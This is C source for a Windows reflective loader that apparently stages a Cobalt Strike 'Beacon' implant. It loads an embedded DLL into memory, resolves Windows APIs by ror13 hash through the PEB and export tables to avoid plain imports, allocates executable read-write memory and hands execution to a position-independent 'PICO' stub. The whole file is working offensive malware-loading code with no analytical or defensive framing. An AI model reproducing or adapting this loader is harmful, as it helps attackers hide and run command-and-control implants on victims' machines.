#include <windows.h>
#include "tcg.h"
#include "util.h"
#include "loader.h"

/*
 * Removes RWX from DLL sections after loading, and applies the appropriate permissions based on the section characteristics
 */

/*
 * Opt-in Dynamic Function Resolution resolver. It turns MODULE$Function into pointers.
 * See dfr "resolve" "ror13" in loader.spec
 * findModuleByHash resolves a module by scanning the InMemoryOrderModuleList in the Process Environment Block (PEB).
 * findFunctionByHash locates a function by iterating over the Export Address Table (EAT) of the resolved module.
 */
FARPROC resolve(DWORD modHash, DWORD funcHash) {
	HANDLE hModule = findModuleByHash(modHash);
	return findFunctionByHash(hModule, funcHash);
}

char * getLoaderStartAddress() {
    return (char *)go;
}

void JumpToFreePICO(IMPORTFUNCS * funcs, char * dllEntry, char *dllBase) {
    char        * dstCode;
    char        * dstData;
    char        * src = GETRESOURCE(_PICO_);
 
    /* Allocate memory for PICO */
    dstData = KERNEL32$VirtualAlloc( NULL, PicoDataSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE );
    dstCode = KERNEL32$VirtualAlloc( NULL, PicoCodeSize(src), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE );
 
    /* load Pico into destination address */
    PicoLoad(funcs, src, dstCode, dstData);
 
    /* Execute PICO */
    ((PICOMAIN_FUNC_3)PicoEntryPoint(src, dstCode)) (getLoaderStartAddress(), dllEntry, dllBase);
}

void go() {
	char * dst;
	char * src;
	DLLDATA dll;
	IMPORTFUNCS funcs;

	/* fetch Beacon DLL from section */
	src = GETRESOURCE(_DLL_);

	/* parse Beacon DLL! */
	ParseDLL(src, &dll);

	/* allocate memory for it! */
	dst =  KERNEL32$VirtualAlloc ( NULL, SizeOfDLL ( &dll ), MEM_COMMIT | MEM_RESERVE | MEM_TOP_DOWN, PAGE_READWRITE );

	/* load DLL into memory */
	LoadDLL(&dll, src, dst);

	/* setup IMPORTFUNCS data structure */
	funcs.GetProcAddress = GetProcAddress;
	funcs.LoadLibraryA   = LoadLibraryA;

	/* process the imports */
	ProcessImports(&funcs, &dll, dst);

	/* fix section permissions */
	fix_section_permissions(&dll, src, dst);

	/* Redirect execution to the FreePICO loader */
	JumpToFreePICO(&funcs, (char *)findFunctionByHash((HANDLE)dst, ror13hash("GetVersions")), dst);
}
